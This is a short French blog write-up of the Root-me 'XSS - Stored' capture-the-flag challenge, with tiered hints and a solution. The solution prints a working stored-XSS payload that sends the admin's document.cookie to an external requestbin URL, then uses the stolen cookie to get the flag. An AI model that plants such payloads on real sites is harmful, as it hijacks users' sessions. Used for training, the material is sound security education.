---
title: Root-me - XSS - Stored
meta_title: ""
description: 
date: 2024-06-07T05:00:00Z
image: /images/rootme_logo.png
categories:
  - WebClient
  - Facile
author: Tmax
tags:
  - WebClient
  - Rootme
  - XSS
draft: false
---

# Introduction

Pour ce challenge, nous allons devoir abuser d'une XXS stockée.

Ce qui signifie qu'un input utilisateur sera interprété comme du code et sera donc exécuté. 

En effet, l'application n'est autre qu'un forum, où un admin semble lire les messages de temps en temps. 

Ce write-up sera en deux parties. 

La première ne contiendra que des hints et aucune solution, contrairement à la seconde. 


{{< tabs >}} {{< tab "Niveau 1" >}}
- Avez-vous testé une injection basique ?
- Vous avez bien lu la description du challenge ? 
- C'est quoi au fait un REQUEST BIN ? 

{{< /tab >}}

{{< tab "Niveau 2" >}}

Personnellement pour solve ce challenge j'ai utilisé https://requestbin.kanbanbox.com. 

J'ai tenté de créer une nouvelle image (`<script>var i = new Image(); ... </script>`), dont sa source serait l'url suivante qui utilise `document.cookie` pour concaténer le cookie admin à l'url saisie en dur : 

```
<script>var i=new Image(); i.src='https://requestbin.kanbanbox.com/syauodsy/?cookie='+encodeURIComponent(document.cookie);</script>
```

En utilisant `encodeURIComponent`, le cookie est correctement encodé pour l'URL, garantissant que tous les caractères spéciaux sont transmis correctement.

Si je retourne sur mon requestbin, je récupère alors le cookie_admin et je peux maintenant récupérer le flag. 

{{< /tab >}}
{{< /tabs >}}
